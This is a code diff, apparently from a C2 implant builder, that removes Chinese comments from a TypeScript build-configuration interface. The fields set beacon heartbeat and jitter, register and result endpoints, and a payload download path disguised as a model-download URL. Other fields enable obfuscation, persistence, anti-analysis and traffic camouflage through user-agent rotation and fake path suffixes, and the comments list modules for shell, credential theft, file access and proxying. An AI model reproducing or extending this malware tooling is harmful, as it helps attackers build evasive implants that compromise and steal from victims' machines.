@@ -428,23 +428,14 @@ export interface BuildConfigRequest {
   applicationType: string;
   serverHost: string;
   serverPort: number;
-  /** 通信协议（'http' | 'https'）；空 = 按 serverHost 前缀自动推断 */
   serverScheme?: string;
-  /** 心跳间隔（毫秒）；空 = 服务端默认 3000 */
   heartbeatIntervalMs?: number;
-  /** 抖动比例（0-0.9）；空 = 服务端默认 0.2 */
   jitterPercent?: number;
-  /** 注册路径；空 = 服务端默认 /api/beacon/register */
   registerPath?: string;
-  /** 心跳路径；空 = 服务端默认 /api/beacon/heartbeat */
   heartbeatPath?: string;
-  /** 结果上报路径；空 = 服务端默认 /api/beacon/result */
   resultPath?: string;
-  /** WebSocket 路径；空 = 服务端默认 /ws/agent */
   wsPath?: string;
-  /** 核心载荷下载路径；空 = 服务端默认 /api/v1/models/{buildId} */
   coreDownloadPath?: string;
-  /** 核心密钥协商路径；空 = 服务端默认 /api/v1/auth/token */
   coreKeyPath?: string;
   enableObfuscation: boolean;
   injectJunkData: boolean;
@@ -460,13 +451,9 @@ export interface BuildConfigRequest {
   copyToAppData: boolean;
   enablePersistence: boolean;
   antiAnalysis: AntiAnalysisConfig;
-  /** 流量伪装：UA 轮换列表（每行一个）。 */
   userAgents?: string[];
-  /** 流量伪装：附加请求头（每行 "Name: value"）。 */
   extraHeaders?: string[];
-  /** 流量伪装：虚假业务路径后缀（每行一个）。 */
   pathSuffixes?: string[];
-  /** 启用的云模块（null/缺省 = 全部）：shell/recon/creds/files/powershell/proxy/script */
   enabledModules?: string[];
 }
 
